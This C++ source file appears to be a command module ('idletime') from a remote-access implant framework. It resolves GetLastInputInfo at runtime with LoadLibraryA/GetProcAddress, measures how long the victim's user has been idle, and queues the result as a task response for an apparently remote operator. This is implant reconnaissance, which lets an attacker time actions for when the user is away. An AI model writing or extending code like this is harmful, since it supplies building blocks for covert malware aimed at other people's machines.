#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_IDLETIME

using namespace stardust;
using namespace starburst;

typedef struct tagLASTINPUTINFO_T {
    UINT cbSize;
    DWORD dwTime;
} LASTINPUTINFO_T;

typedef BOOL ( WINAPI *fn_GetLastInputInfo )( LASTINPUTINFO_T* );

auto declfn starburst::cmd_idletime(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    DBG_PRINT( inst, "cmd_idletime\n" );

    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
    if ( !h_user32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
        return;
    }

    auto pGetLastInputInfo = reinterpret_cast<fn_GetLastInputInfo>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetLastInputInfo" ) ) );

    if ( !pGetLastInputInfo ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve GetLastInputInfo" ) ) );
        return;
    }

    LASTINPUTINFO_T lii = {};
    lii.cbSize = sizeof( LASTINPUTINFO_T );

    if ( !pGetLastInputInfo( &lii ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetLastInputInfo failed" ) ) );
        return;
    }

    DWORD current_tick = inst.kernel32.GetTickCount();
    DWORD idle_ms = current_tick - lii.dwTime;

    uint32_t total_sec = idle_ms / 1000;
    uint32_t hours   = total_sec / 3600;
    uint32_t minutes = ( total_sec % 3600 ) / 60;
    uint32_t seconds = total_sec % 60;

    char output[128] = { 0 };
    uint32_t off = 0;
    char num[16];

    str_copy( output, symbol<char*>( const_cast<char*>( "User idle: " ) ) );
    off = str_len( output );

    int_to_str( num, hours, 10 );
    memory::copy( output + off, num, str_len( num ) );
    off += str_len( num );
    str_copy( output + off, symbol<char*>( const_cast<char*>( " hours, " ) ) );
    off += 8;

    int_to_str( num, minutes, 10 );
    memory::copy( output + off, num, str_len( num ) );
    off += str_len( num );
    str_copy( output + off, symbol<char*>( const_cast<char*>( " minutes, " ) ) );
    off += 10;

    int_to_str( num, seconds, 10 );
    memory::copy( output + off, num, str_len( num ) );
    off += str_len( num );
    str_copy( output + off, symbol<char*>( const_cast<char*>( " seconds" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
}

#endif
